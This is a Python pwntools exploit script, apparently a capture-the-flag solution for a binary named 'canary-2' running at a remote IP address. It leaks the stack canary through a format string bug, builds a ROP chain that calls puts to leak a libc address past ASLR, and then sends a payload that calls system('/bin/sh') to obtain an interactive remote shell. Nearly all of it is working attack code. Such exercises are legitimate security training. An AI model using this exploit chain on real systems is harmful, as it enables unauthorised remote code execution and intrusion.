import sys
from pwn import *
from hexdump import hexdump


"""
First, as for canary-1, use format string to leak the canary value.
Our goal is to call system("/bin/sh"). In order to do that,
we need to leak the addresses of system and "/bin/sh" since ASLR is on.
We have puts in the binary, and we want to leak its libc address (i.e. call puts(puts_got)).
Having puts address and system & "/bin/sh" offsets from libc, we can find their actual values
by offsed-based computing: Xaddr = libc_start + Xoffset.
Now we just need to craft a payload that does system("/bin/sh"), correctly placing the canary value.

To put the first param from stack in rdi, we use the pop rdi; ret gadget.
"""


upk = lambda x : unpack(x, 'all', endian='little', sign=False)

def get_canary(recvd):
    i = recvd[::-1].index('x')
    canary = recvd[::-1][:i][::-1][:16]
    canary = int(canary, 16)
    return canary

def get_puts(recvd):
    i = recvd.index("\n") + 1
    r = recvd[i:]
    i = r.index("Hello") - 1
    r = r[:i]
    return upk(r)


exec_file = "./canary-2"
libc_file = "./libc.so.6"
context.binary = exec_file

e = ELF(exec_file)
libc = ELF(libc_file)

io = remote("141.85.224.100", 31337)
# io = process(exec_file)

offset = 0x20 - 0x8
pop_rdi_ret = 0x400823


# stage-1) leak canary
payload = "y" + "%p" * 5 + "%p" * 4

r = io.recvuntil("[y/n]\n")
io.sendline(payload)
r = io.recv()
r = io.recv()

canary = get_canary(r)
log.info("canary: {}".format(hex(canary)))


# stage-2) leak puts address from plt
puts_plt = e.symbols['puts']
puts_got = e.symbols['got.puts']
main_address = e.symbols['main']

log.info("puts_got: 0x{:016x}".format(puts_got))
log.info("puts_plt: 0x{:016x}".format(puts_plt))
log.info("main_address: 0x{:016x}".format(main_address))

# Payload calling puts_plt(puts_got), careful with canary
payload = "A" * offset + p64(canary) + "A" * 8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_address)

io.sendline(payload)
r = io.recv()
io.sendline("n")
r = io.recv()
r = io.recv()

puts_address = get_puts(r)
log.info("puts_address: 0x{:016x}".format(puts_address))


# stage-3) Compute the address of system() and "/bin/sh" (from puts) and provide a new payload that calls system("/bin/sh").
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search("/bin/sh\x00"))
libc_start_address = puts_address - puts_offset
system_address = libc_start_address + system_offset
bin_sh_address = libc_start_address + bin_sh_offset

log.info("puts_offset: 0x{:016x}".format(puts_offset))
log.info("system_offset: 0x{:016x}".format(system_offset))
log.info("bin_sh_offset: 0x{:016x}".format(bin_sh_offset))
log.info("libc_start_address: 0x{:016x}".format(libc_start_address))
log.info("system_address: 0x{:016x}".format(system_address))
log.info("bin_sh_address: 0x{:016x}".format(bin_sh_address))

# Payload calling system("/bin/sh"), careful with canary
payload = "A" * offset + p64(canary) + "A" * 8 + p64(pop_rdi_ret) + p64(bin_sh_address) + p64(system_address)

io.sendline(payload)
r = io.recv()
io.sendline("n")
r = io.recv()
r = io.recv()

io.interactive()
